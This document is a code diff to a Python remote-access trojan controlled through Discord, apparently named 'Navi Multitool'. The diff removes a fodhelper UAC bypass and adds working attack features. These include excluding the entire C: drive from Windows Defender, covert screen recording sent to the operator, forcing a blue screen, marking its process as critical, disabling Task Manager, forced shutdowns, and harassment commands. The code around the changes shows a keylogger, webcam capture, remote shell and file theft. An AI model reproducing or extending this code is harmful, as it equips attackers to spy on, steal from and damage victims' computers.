@@ -12,6 +12,7 @@ import asyncio
 import zipfile
 import threading
 import platform
+import struct as _struct
 import subprocess
 import urllib.request
 
@@ -28,7 +29,6 @@ from discord import utils
 from comtypes import CLSCTX_ALL
 import comtypes
 
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
 import win32gui
 from win32 import win32gui
@@ -73,40 +73,6 @@ def hide_and_persist():
 
 hide_and_persist()
 
-helpmenu = """
---> `!message` = Show a message box displaying your text / Syntax  = "!message example"
---> `!shell` = Execute a shell command /Syntax  = "!shell whoami"
---> `!webcampic` = Take a picture from the webcam
---> `!windowstart` = Start logging current user window (logging is shown in the bot activity)
---> `!windowstop` = Stop logging current user window
---> `!voice` = Make a voice say outloud a custom sentence / Syntax = "!voice test"
---> `!admincheck` = Check if program has admin privileges
---> `!sysinfo` = Gives info about infected computer
---> `!history` = Get computer navigation history
---> `!download` = Download a file from infected computer
---> `!upload` = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
---> `!cd` = Changes directory
---> `!write` = Type your desired sentence on infected computer
---> `!wallpaper` = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
---> `!clipboard` = Retrieve infected computer clipboard content
---> `!geolocate` = Geolocate computer
---> `!startkeylogger` = Starts a keylogger / Warning : Likely to trigger AV
---> `!stopkeylogger` = Stops keylogger
---> `!dumpkeylogger` = Dumps the keylog
---> `!volumemax` = Put volume at 100%
---> `!volumezero` = Put volume at 0%
---> `!idletime` = Get the idle time of user
---> `!sing` = Play chosen video in background (Only works with youtube links)
---> `!stopsing` = Stop video playing in background
---> `!blockinput` = Blocks user's keyboard and mouse / Warning : Admin rights are required
---> `!unblockinput` = Unblocks user's keyboard and mouse / Warning : Admin rights are required
---> `!screenshot` = Get the screenshot of the user's current screen
---> `!exit` = Exit program
---> `!kill` = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
-
-_powered by navi*_
-https://github.com/glockinhand/navi-multitool
-"""
 
 async def activity(client):
     while True:
@@ -167,19 +133,12 @@ async def on_ready():
     game = discord.Game(f"Window logging stopped")
     await bot.change_presence(status=discord.Status.online, activity=game)
 
+
 def volumeup():
-    devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = cast(interface, POINTER(IAudioEndpointVolume))
-    if volume.GetMute() == 1:
-        volume.SetMute(0, None)
-    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
+    os.system("powershell -c (New-Object -ComObject WScript.Shell).SendKeys([char]175)")
 
 def volumedown():
-    devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = cast(interface, POINTER(IAudioEndpointVolume))
-    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
+    os.system("powershell -c (New-Object -ComObject WScript.Shell).SendKeys([char]174)")
 
 @bot.event
 async def on_message(message):
@@ -325,7 +284,85 @@ async def on_message(message):
         await message.channel.send(embed=navi_embed(f"📂 **Directory Update:** Current path: `{os.getcwd()}`"))
 
     if message.content == "!help":
-        await message.channel.send(embed=navi_embed(helpmenu, thumbnail=False))
+        thumb = "https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
+        foot = "Navi Multitool • github.com/glockinhand/navi-multitool"
+        e1 = discord.Embed(title="NAVI • COMMANDS (1/2)", color=0x00aaff)
+        e1.set_thumbnail(url=thumb)
+        e1.add_field(name="📡 System", value=(
+            "`!sysinfo` – System & IP info\n"
+            "`!admincheck` – Check admin privileges\n"
+            "`!geolocate` – Geolocate via IP\n"
+            "`!idletime` – User idle duration\n"
+            "`!getadmin` – Request admin privileges (UAC)\n"
+            "`!disabledefender` – Exclude C:\\ from Defender 🔑"
+        ), inline=False)
+        e1.add_field(name="📂 File Management", value=(
+            "`!cd <path>` – Change directory\n"
+            "`!download <file>` – Download from target\n"
+            "`!upload <file>` – Upload to target (attach file)"
+        ), inline=False)
+        e1.add_field(name="⚡ Execution", value=(
+            "`!shell <cmd>` – Execute shell command\n"
+            "`!write <text>` – Type text on target\n"
+            "`!voice <text>` – Text-to-speech\n"
+            "`!sing <url>` – Play YouTube hidden\n"
+            "`!stopsing` – Stop playback"
+        ), inline=False)
+        e1.add_field(name="👁️ Surveillance", value=(
+            "`!screenshot` – Capture screen\n"
+            "`!screenrecord <sec>` – Record screen (1-30s)\n"
+            "`!webcampic` – Webcam snapshot\n"
+            "`!clipboard` – Clipboard content\n"
+            "`!history` – Browser history\n"
+            "`!windowstart` / `!windowstop` – Window logging"
+        ), inline=False)
+        e1.add_field(name="⌨️ Keylogger", value=(
+            "`!startkeylogger` – Start keylogger ⚠️\n"
+            "`!stopkeylogger` – Stop keylogger\n"
+            "`!dumpkeylogger` – Dump keylog file"
+        ), inline=False)
+        e1.set_footer(text=f"🔑 = Admin required • ⚠️ = May trigger AV • Page 1/3", icon_url=thumb)
+        e2 = discord.Embed(title="NAVI • COMMANDS (2/3)", color=0x00aaff)
+        e2.set_thumbnail(url=thumb)
+        e2.add_field(name="🎭 Trolling", value=(
+            "`!message <text>` – Show message box\n"
+            "`!fakeerror <count> <text>` – Spam error boxes\n"
+            "`!jumpscare` – Fullscreen scare + loud sound\n"
+            "`!wallpaper` – Change wallpaper (attach img)\n"
+            "`!flipscreen` – Flip screen trick / `reset`\n"
+            "`!crazymouse <sec>` – Random mouse movement\n"
+            "`!earthquake <sec>` – Shake all windows\n"
+            "`!spamtts <count> <text>` – Spam TTS voice\n"
+            "`!beep <count>` – System beep spam\n"
+            "`!rickroll` – Classic rickroll\n"
+            "`!opencd` / `!closecd` – CD tray control\n"
+            "`!swapbuttons` / `!unswapbuttons` – Swap mouse LR"
+        ), inline=False)
+        e2.set_footer(text=f"🔑 = Admin required • ⚠️ = May trigger AV • Page 2/3", icon_url=thumb)
+        e3 = discord.Embed(title="NAVI • COMMANDS (3/3)", color=0x00aaff)
+        e3.set_thumbnail(url=thumb)
+        e3.add_field(name="🎭 Trolling (cont.)", value=(
+            "`!volumemax` / `!volumezero` – Volume control\n"
+            "`!blockinput` / `!unblockinput` – Block I/O 🔑\n"
+            "`!hidedesktop` – Toggle desktop icons\n"
+            "`!disabletaskmgr` / `!enabletaskmgr` – Task manager 🔑"
+        ), inline=False)
+        e3.add_field(name="☠️ Destructive", value=(
+            "`!shutdown <sec>` – Shutdown with timer\n"
+            "`!restart` – Restart PC\n"
+            "`!logoff` – Log off user\n"
+            "`!critproc` – Make process critical (BSOD on kill) 🔑\n"
+            "`!uncritproc` – Remove critical flag 🔑\n"
+            "`!bsod` – Blue screen of death 🔑"
+        ), inline=False)
+        e3.add_field(name="🔧 Session", value=(
+            "`!exit` – Exit stub\n"
+            "`!kill <session/all>` – Kill sessions"
+        ), inline=False)
+        e3.set_footer(text=f"🔑 = Admin required • ⚠️ = May trigger AV • Page 3/3", icon_url=thumb)
+        await message.channel.send(embed=e1)
+        await message.channel.send(embed=e2)
+        await message.channel.send(embed=e3)
 
     if message.content.startswith("!write"):
         if message.content[7:] == "enter":
@@ -383,71 +420,37 @@ async def on_message(message):
         else:
             await message.channel.send(embed=navi_embed("User does not have admin privileges.", color=0xff0000))
 
-    if message.content == "!uacbypass":
-        if 'logonserver' in os.environ:
-            server = os.environ['logonserver'][2:]
-        else:
-            server = None
-        def if_user_is_admin(Server):
-            groups = win32net.NetUserGetLocalGroups(Server, os.getlogin())
-            isadmin = False
-            for group in groups:
-                if group.lower().startswith('admin'):
-                    isadmin = True
-            return isadmin, groups
-        is_admin, groups = if_user_is_admin(server)
+    if message.content == "!getadmin":
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
-            print('User in admin group trying to bypass uac')
-            CMD = "C:\\Windows\\System32\\cmd.exe"
-            FOD_HELPER = 'C:\\Windows\\System32\\fodhelper.exe'
-            COMM = "start"
-            REG_PATH = 'Software\\Classes\\ms-settings\\shell\\open\\command'
-            DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
-
-            def is_running_as_admin():
-                return ctypes.windll.shell32.IsUserAnAdmin()
-
-            def create_reg_key(key, value):
-                try:
-                    winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
-                    registry_key = winreg.OpenKey(
-                        winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
-                    winreg.SetValueEx(registry_key, key, 0,
-                                      winreg.REG_SZ, value)
-                    winreg.CloseKey(registry_key)
-                except WindowsError:
-                    raise
-
-            def bypass_uac(cmd):
-                try:
-                    create_reg_key(DELEGATE_EXEC_REG_KEY, '')
-                    create_reg_key(None, cmd)
-                except WindowsError:
-                    raise
-
-            def execute():
-                if not is_running_as_admin():
-                    print(
-                        '[!] The script is NOT running with administrative privileges')
-                    print('[+] Trying to bypass the UAC')
-                    try:
-                        current_dir = os.path.dirname(
-                            os.path.realpath(__file__)) + '\\' + sys.argv[0]
-                        cmd = '{} /k {} {}'.format(CMD, COMM, current_dir)
-                        print(cmd)
-                        bypass_uac(cmd)
-                        os.system(FOD_HELPER)
-                        sys.exit(0)
-                    except WindowsError:
-                        sys.exit(1)
-                else:
-                    print(
-                        '[+] The script is running with administrative privileges!')
-            if __name__ == '__main__':
-                execute()
+            await message.channel.send(embed=navi_embed("✅ Already running with admin privileges.", color=0x00ff00))
         else:
-            print("failed")
-            await message.channel.send(embed=navi_embed("UAC Bypass failed: User not in administrator group.", color=0xff0000))
+            try:
+                path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+                if getattr(sys, 'frozen', False):
+                    ctypes.windll.shell32.ShellExecuteW(None, "runas", path, "", None, 0)
+                else:
+                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{path}"', None, 0)
+                await message.channel.send(embed=navi_embed("🔑 **UAC:** Admin prompt sent. A new admin session will connect shortly."))
+                await asyncio.sleep(3)
+                exit()
+            except Exception as e:
+                await message.channel.send(embed=navi_embed(f"Failed to request admin: `{str(e)}`", color=0xff0000))
+
+    if message.content == "!disabledefender":
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin:
+            result = subprocess.run(
+                ["powershell", "-ExecutionPolicy", "Bypass", "-Command",
+                 'Add-MpPreference -ExclusionPath "C:\\" -ErrorAction Stop'],
+                capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            if result.returncode == 0:
+                await message.channel.send(embed=navi_embed("🛡️ **Defender:** Exclusion added for `C:\\`. Entire drive is now excluded."))
+            else:
+                await message.channel.send(embed=navi_embed(f"Defender exclusion failed: `{result.stderr.strip()}`", color=0xff0000))
+        else:
+            await message.channel.send(embed=navi_embed("Admin rights required for Defender exclusions.", color=0xff0000))
 
     if message.content.startswith("!sing"):
         volumeup()
@@ -539,5 +542,285 @@ async def on_message(message):
             await message.channel.send(embed=navi_embed("🔓 **System:** User input restored."))
         else:
             await message.channel.send(embed=navi_embed("Admin rights are required for this operation.", color=0xff0000))
+
+    if message.content.startswith("!screenrecord"):
+        try:
+            seconds = int(message.content[14:].strip())
+            if seconds < 1:
+                seconds = 1
+            if seconds > 30:
+                seconds = 30
+            await message.channel.send(embed=navi_embed(f"🎬 **Screen Recording:** Capturing {seconds}s..."))
+            temp = os.getenv('TEMP')
+            frames_dir = os.path.join(temp, "navi_frames")
+            os.makedirs(frames_dir, exist_ok=True)
+            frame_files = []
+            fps = 2
+            total_frames = seconds * fps
+            with mss() as sct:
+                for i in range(total_frames):
+                    filename = os.path.join(frames_dir, f"frame_{i:04d}.png")
+                    sct.shot(output=filename)
+                    frame_files.append(filename)
+                    await asyncio.sleep(1.0 / fps)
+            zip_path = os.path.join(temp, "screen_recording.zip")
+            with ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for f in frame_files:
+                    zf.write(f, os.path.basename(f))
+            file = discord.File(zip_path, filename="screen_recording.zip")
+            await message.channel.send(embed=navi_embed(f"🎬 **Screen Recording:** {seconds}s captured ({len(frame_files)} frames @ {fps}fps)."), file=file)
+            for f in frame_files:
+                try:
+                    os.remove(f)
+                except:
+                    pass
+            try:
+                os.rmdir(frames_dir)
+            except:
+                pass
+            os.remove(zip_path)
+        except ValueError:
+            await message.channel.send(embed=navi_embed("Syntax: `!screenrecord <seconds>` (1-30)", color=0xff0000))
+        except Exception as e:
+            await message.channel.send(embed=navi_embed(f"Screen recording failed: `{str(e)}`", color=0xff0000))
+
+    if message.content.startswith("!flipscreen"):
+        try:
+            arg = message.content[12:].strip().lower()
+            temp = os.getenv('TEMP')
+            if arg == "reset":
+                taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+                ctypes.windll.user32.ShowWindow(taskbar, 5)
+                progman = ctypes.windll.user32.FindWindowW("Progman", None)
+                ctypes.windll.user32.SendMessageW(progman, 0x0111, 0x7402, 0)
+                await message.channel.send(embed=navi_embed("🔄 **Display:** Taskbar & icons restored. Use `!wallpaper` to fix wallpaper."))
+            else:
+                with mss() as sct:
+                    sct.shot(output=os.path.join(temp, "flip_ss.png"))
+                flip_src = os.path.join(temp, "flip_ss.png").replace("\\", "\\\\")
+                flip_dst = os.path.join(temp, "flip_wp.bmp").replace("\\", "\\\\")
+                ps = f'Add-Type -AssemblyName System.Drawing; $i=[System.Drawing.Image]::FromFile("{flip_src}"); $i.RotateFlip([System.Drawing.RotateFlipType]::Rotate180FlipNone); $i.Save("{flip_dst}",[System.Drawing.Imaging.ImageFormat]::Bmp); $i.Dispose()'
+                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                wp_path = os.path.join(temp, "flip_wp.bmp")
+                ctypes.windll.user32.SystemParametersInfoW(20, 0, wp_path, 3)
+                progman = ctypes.windll.user32.FindWindowW("Progman", None)
+                ctypes.windll.user32.SendMessageW(progman, 0x0111, 0x7402, 0)
+                taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+                ctypes.windll.user32.ShowWindow(taskbar, 0)
+                await message.channel.send(embed=navi_embed("🔄 **Display:** Screen flipped. Use `!flipscreen reset` to undo."))
+        except Exception as e:
+            await message.channel.send(embed=navi_embed(f"Flip failed: `{str(e)}`", color=0xff0000))
+
+    if message.content.startswith("!crazymouse"):
+        try:
+            sec = int(message.content[12:].strip())
+            if sec < 1: sec = 1
+            if sec > 60: sec = 60
+            await message.channel.send(embed=navi_embed(f"🐭 **Mouse:** Going crazy for {sec}s..."))
+            def _crazy_mouse():
+                end_t = time.time() + sec
+                sw, sh = pyautogui.size()
+                while time.time() < end_t:
+                    pyautogui.moveTo(random.randint(0, sw), random.randint(0, sh), duration=0.05)
+            threading.Thread(target=_crazy_mouse, daemon=True).start()
+        except ValueError:
+            await message.channel.send(embed=navi_embed("Syntax: `!crazymouse <seconds>` (1-60)", color=0xff0000))
+
+    if message.content.startswith("!earthquake"):
+        try:
+            sec = int(message.content[12:].strip())
+            if sec < 1: sec = 1
+            if sec > 30: sec = 30
+            await message.channel.send(embed=navi_embed(f"🌍 **Earthquake:** Shaking for {sec}s..."))
+            def _shake():
+                end_t = time.time() + sec
+                while time.time() < end_t:
+                    def _enum(hwnd, _):
+                        if win32gui.IsWindowVisible(hwnd):
+                            try:
+                                r = win32gui.GetWindowRect(hwnd)
+                                win32gui.MoveWindow(hwnd, r[0]+random.randint(-15,15), r[1]+random.randint(-15,15), r[2]-r[0], r[3]-r[1], True)
+                            except: pass
+                    try: win32gui.EnumWindows(_enum, None)
+                    except: pass
+                    time.sleep(0.04)
+            threading.Thread(target=_shake, daemon=True).start()
+        except ValueError:
+            await message.channel.send(embed=navi_embed("Syntax: `!earthquake <seconds>` (1-30)", color=0xff0000))
+
+    if message.content.startswith("!fakeerror"):
+        try:
+            parts = message.content[11:].strip().split(" ", 1)
+            count = min(int(parts[0]), 50)
+            txt = parts[1] if len(parts) > 1 else "A critical system error has occurred."
+            def _spam_err():
+                for _ in range(count):
+                    ctypes.windll.user32.MessageBoxW(0, txt, "Critical Error", 0x10)
+            threading.Thread(target=_spam_err, daemon=True).start()
+            await message.channel.send(embed=navi_embed(f"⚠️ **Fake Error:** Spawning {count} error boxes."))
+        except:
+            await message.channel.send(embed=navi_embed("Syntax: `!fakeerror <count> <text>`", color=0xff0000))
+
+    if message.content.startswith("!spamtts"):
+        try:
+            parts = message.content[9:].strip().split(" ", 1)
+            count = min(int(parts[0]), 20)
+            txt = parts[1] if len(parts) > 1 else "You have been hacked"
+            volumeup()
+            def _spam_tts():
+                speak = wincl.Dispatch("SAPI.SpVoice")
+                for _ in range(count):
+                    speak.Speak(txt)
+                comtypes.CoUninitialize()
+            threading.Thread(target=_spam_tts, daemon=True).start()
+            await message.channel.send(embed=navi_embed(f"🗣️ **TTS Spam:** Speaking '{txt}' x{count}."))
+        except:
+            await message.channel.send(embed=navi_embed("Syntax: `!spamtts <count> <text>`", color=0xff0000))
+
+    if message.content == "!opencd":
+        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
+        await message.channel.send(embed=navi_embed("💿 **CD Tray:** Opened."))
+
+    if message.content == "!closecd":
+        ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
+        await message.channel.send(embed=navi_embed("💿 **CD Tray:** Closed."))
+
+    if message.content == "!swapbuttons":
+        ctypes.windll.user32.SwapMouseButton(True)
+        await message.channel.send(embed=navi_embed("🖱️ **Mouse:** Buttons swapped (left ↔ right)."))
+
+    if message.content == "!unswapbuttons":
+        ctypes.windll.user32.SwapMouseButton(False)
+        await message.channel.send(embed=navi_embed("🖱️ **Mouse:** Buttons restored to normal."))
+
+    if message.content == "!hidedesktop":
+        try:
+            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
+            try:
+                val, _ = winreg.QueryValueEx(key, "HideIcons")
+                new_val = 0 if val else 1
+            except:
+                new_val = 1
+            winreg.SetValueEx(key, "HideIcons", 0, winreg.REG_DWORD, new_val)
+            winreg.CloseKey(key)
+            subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            await asyncio.sleep(1)
+            subprocess.Popen(["explorer.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
+            label = "hidden" if new_val else "restored"
+            await message.channel.send(embed=navi_embed(f"🖥️ **Desktop:** Icons {label}."))
+        except Exception as e:
+            await message.channel.send(embed=navi_embed(f"Failed: `{str(e)}`", color=0xff0000))
+
+    if message.content == "!bsod":
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin:
+            await message.channel.send(embed=navi_embed("💀 **BSOD:** Triggering blue screen..."))
+            nullptr = ctypes.c_int(0)
+            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(nullptr))
+            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(nullptr))
+        else:
+            await message.channel.send(embed=navi_embed("Admin rights required for BSOD.", color=0xff0000))
+
+    if message.content == "!jumpscare":
+        try:
+            volumeup()
+            temp = os.getenv('TEMP')
+            html_path = os.path.join(temp, "update_check.html")
+            with open(html_path, "w") as f:
+                f.write('<html><head><style>*{margin:0;padding:0;cursor:none}body{background:#000;overflow:hidden}</style></head><body>'
+                    '<img id="s" src="https://upload.wikimedia.org/wikipedia/commons/8/89/Scary_Face.jpg" style="width:100vw;height:100vh;object-fit:cover;display:none">'
+                    '<script>'
+                    'let c=new(window.AudioContext||window.webkitAudioContext),o=c.createOscillator(),g=c.createGain();'
+                    'o.type="sawtooth";o.frequency.value=180;g.gain.value=1;o.connect(g);g.connect(c.destination);'
+                    'document.onclick=()=>{document.documentElement.requestFullscreen().catch(()=>{})};'
+                    'setTimeout(()=>{document.getElementById("s").style.display="block";o.start();'
+                    'document.documentElement.requestFullscreen().catch(()=>{});'
+                    'setTimeout(()=>{o.stop();},4000);},300);'
+                    '</script></body></html>')
+            os.startfile(html_path)
+            def _beep_scare():
+                for _ in range(6):
+                    ctypes.windll.kernel32.Beep(2500, 400)
+                    time.sleep(0.1)
+            threading.Thread(target=_beep_scare, daemon=True).start()
+            await message.channel.send(embed=navi_embed("👻 **Jumpscare:** Executed."))
+        except Exception as e:
+            await message.channel.send(embed=navi_embed(f"Jumpscare failed: `{str(e)}`", color=0xff0000))
+
+    if message.content.startswith("!shutdown"):
+        try:
+            sec = int(message.content[9:].strip())
+            if sec < 0: sec = 0
+            subprocess.run(["shutdown", "/s", "/t", str(sec), "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
+            await message.channel.send(embed=navi_embed(f"⏻ **System:** Shutdown in {sec}s."))
+        except ValueError:
+            await message.channel.send(embed=navi_embed("Syntax: `!shutdown <seconds>`", color=0xff0000))
+
+    if message.content == "!restart":
+        subprocess.run(["shutdown", "/r", "/t", "0", "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
+        await message.channel.send(embed=navi_embed("🔄 **System:** Restarting now."))
+
+    if message.content == "!logoff":
+        subprocess.run(["shutdown", "/l", "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
+        await message.channel.send(embed=navi_embed("🚪 **System:** User logged off."))
+
+    if message.content == "!disabletaskmgr":
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin:
+            try:
+                reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+                winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
+                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+                winreg.CloseKey(key)
+                await message.channel.send(embed=navi_embed("🚫 **System:** Task Manager disabled."))
+            except Exception as e:
+                await message.channel.send(embed=navi_embed(f"Failed: `{str(e)}`", color=0xff0000))
+        else:
+            await message.channel.send(embed=navi_embed("Admin rights required.", color=0xff0000))
+
+    if message.content == "!enabletaskmgr":
+        try:
+            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
+            winreg.DeleteValue(key, "DisableTaskMgr")
+            winreg.CloseKey(key)
+            await message.channel.send(embed=navi_embed("✅ **System:** Task Manager re-enabled."))
+        except Exception as e:
+            await message.channel.send(embed=navi_embed(f"Failed: `{str(e)}`", color=0xff0000))
+
+    if message.content == "!critproc":
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin:
+            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+            await message.channel.send(embed=navi_embed("☠️ **System:** Process marked as critical. Killing it will cause BSOD."))
+        else:
+            await message.channel.send(embed=navi_embed("Admin rights required.", color=0xff0000))
+
+    if message.content == "!uncritproc":
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin:
+            ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
+            await message.channel.send(embed=navi_embed("✅ **System:** Critical flag removed from process."))
+        else:
+            await message.channel.send(embed=navi_embed("Admin rights required.", color=0xff0000))
+
+    if message.content == "!rickroll":
+        os.startfile("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+        await message.channel.send(embed=navi_embed("🎵 **Rickroll:** Never gonna give you up..."))
+
+    if message.content.startswith("!beep"):
+        try:
+            count = min(int(message.content[6:].strip()), 100)
+            if count < 1: count = 1
+            def _beep_spam():
+                for _ in range(count):
+                    freq = random.randint(200, 5000)
+                    ctypes.windll.kernel32.Beep(freq, 200)
+            threading.Thread(target=_beep_spam, daemon=True).start()
+            await message.channel.send(embed=navi_embed(f"🔊 **Beep:** Spamming {count} beeps."))
+        except ValueError:
+            await message.channel.send(embed=navi_embed("Syntax: `!beep <count>`", color=0xff0000))
 
 bot.run(token)
